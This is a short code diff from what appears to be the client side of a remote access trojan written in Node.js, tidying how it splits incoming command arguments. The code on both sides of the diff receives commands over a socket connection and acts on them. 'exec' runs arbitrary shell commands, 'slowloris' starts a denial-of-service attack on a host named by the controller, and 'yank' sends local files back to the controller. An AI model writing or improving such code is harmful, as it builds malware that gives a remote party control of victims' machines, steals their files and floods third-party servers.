@@ -60,32 +60,21 @@ async function execute(command) {
 
 client.on("data", (data) => {
 	const dataStr = data.toString();
-
-	const args = {
-		first: dataStr.split(" ")[1],
-		second: dataStr.split(" ")[2],
-		third: dataStr.split(" ")[3],
-		fourth: dataStr.split(" ")[4],
-	};
+	const arg = dataStr.split(" ");
 
 	if (dataStr.startsWith("exec")) {
-		if (args.first === "cd") {
+		if (arg[1] === "cd") {
 			path = changeDir(data, path);
 		}
 		execute(dataStr.replace("exec", ""));
 	}
 
 	if (dataStr.startsWith("slowloris")) {
-		slowLoris(
-			args.first,
-			args.second,
-			args.third,
-			args.fourth
-		);
+		slowLoris(arg[1], arg[2], arg[3], arg[4]);
 	}
 
 	if (dataStr.startsWith("yank")) {
-		sendFile(path + "\\" + args.first);
+		sendFile(path + "\\" + arg[1]);
 	}
 });
 
